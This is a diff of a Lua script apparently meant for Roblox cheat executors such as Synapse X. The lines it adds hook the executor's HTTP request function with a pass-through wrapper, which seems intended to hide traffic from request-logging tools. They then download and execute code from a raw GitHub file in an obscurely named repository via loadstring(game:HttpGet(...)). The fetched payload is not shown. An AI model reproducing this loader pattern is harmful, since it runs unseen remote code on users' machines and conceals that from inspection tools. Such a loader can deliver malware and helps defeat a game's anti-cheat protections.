@@ -11,4 +11,16 @@ R = hookfunction(syn.request, function(...)
       return R(...)
       end)
       loadstring(game:HttpGet("https://raw.githubusercontent.com/1379qpalzmtygvezimaliexcvbnqplasdfg/BOOSBS/refs/heads/main/githubusercontent.txt"))()
-      end
+if identifyexecutor() == 'Synapse X' then
+local R;
+R = hookfunction(syn.request, function(...)
+   return R(...)
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/1379qpalzmtygvezimaliexcvbnqplasdfg/BOOSBS/refs/heads/main/githubusercontent.txt"))()
+else
+local R;
+R = hookfunction(request, function(...)
+   return R(...)
+end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/1379qpalzmtygvezimaliexcvbnqplasdfg/BOOSBS/refs/heads/main/githubusercontent.txt"))()
+end
